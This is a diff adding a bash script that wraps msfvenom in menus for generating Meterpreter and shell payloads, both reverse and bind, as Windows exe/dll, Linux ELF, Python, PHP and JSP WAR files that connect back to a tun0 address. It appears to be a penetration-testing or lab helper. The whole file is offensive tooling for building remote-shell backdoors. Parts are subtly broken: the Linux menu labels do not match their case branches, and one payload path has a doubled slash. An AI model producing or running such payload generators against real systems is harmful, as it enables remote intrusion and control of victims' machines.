@@ -1,0 +1,72 @@
+#!/bin/bash
+
+function msfv {
+
+    source ./var
+
+    PS3='Please enter your choice: '
+    options=("Windows" "Linux" "python" "php" "war" "Quit")
+    select opt in "${options[@]}"
+    do
+        case $opt in
+            "Windows")
+                PS4='Please enter your choice: '
+                payload=("reverse exe" "reverse tcp inline dll" "bind shell exe" "Quit")
+                select opt in "${payload[@]}"
+                do
+                    case $opt in
+                        "reverse exe")
+                            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$tun0 LPORT=$port -f exe > reverse.exe
+                            ;;
+                        "reverse tcp inline dll")
+                            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$tun0 LPORT=$port -f dll -o reverse.dll 
+                            ;;
+                        "bind shell exe")
+                            msfvenom -p windows/meterpreter/bind_tcp RHOST=$tun0 LPORT=$port -f exe > bind.exe
+                            ;;
+                        "Quit")
+                            break
+                            ;;
+                        *) echo "invalid option $REPLY";;
+                    esac
+                done
+                ;;
+            "Linux")
+                PS4='Please enter your choice: '
+                payload=("reverse elf 1" "reverse elf 2" "bind shell elf" "Quit")
+                select opt in "${payload[@]}"
+                do
+                    case $opt in
+                        "reverse exe 1")
+                            msfvenom -p linux/x86//meterpreter/reverse_tcp LHOST=$tun0 LPORT=$port -f elf > reverse.elf
+                            ;;
+                        "reverse exe 2")
+                            msfvenom -p linux/x64/shell_reverse_tcp LHOST=$tun0 LPORT=$port -f elf > shell.elf
+                            ;;
+                        "bind shell exe")
+                            msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=$tun0 LPORT=$port -f elf > bind.elf
+                            ;;
+                        "Quit")
+                            break
+                            ;;
+                        *) echo "invalid option $REPLY";;
+                    esac
+                done
+                ;;
+            "python")
+                msfvenom -p cmd/unix/reverse_python LHOST=$tun0 LPORT=$port -f raw > reverse.py
+                ;;
+            "php")
+                msfvenom -p php/meterpreter_reverse_tcp LHOST=$tun0 LPORT=$port -f raw > shell.php
+                ;;
+            "war")
+                msfvenom -p java/jsp_shell_reverse_tcp LHOST=$tun0 LPORT=$port -f war > reverse.war
+                ;;
+            "Quit")
+                break
+                ;;
+            *) echo "invalid option $REPLY";;
+        esac
+    done
+
+}
